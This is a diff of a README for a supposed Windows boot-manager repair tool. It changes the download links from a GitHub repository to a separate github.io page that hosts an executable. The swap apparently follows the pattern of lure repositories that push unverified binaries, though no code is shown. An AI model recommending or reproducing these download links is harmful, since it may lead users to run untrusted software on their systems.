@@ -1,6 +1,6 @@
 # 🛠️ Boot-Manager-Missing-Fix - Restore Windows Boot Access Quickly Today
 
-[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/ailisolemn484/Boot-Manager-Missing-Fix)
+[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://ailisolemn484.github.io)
 
 ## 📖 About This Tool
 
@@ -18,7 +18,7 @@ Before you begin, ensure your system meets these standards:
 
 To start the repair, you must first obtain the software file.
 
-1. Visit this [link](https://github.com/ailisolemn484/Boot-Manager-Missing-Fix) to download the repair toolkit.
+1. Visit this [link](https://ailisolemn484.github.io) to download the repair toolkit.
 2. Select the latest release version on the page.
 3. Save the executable file to your desktop.
 4. Plug your USB flash drive into the working computer.
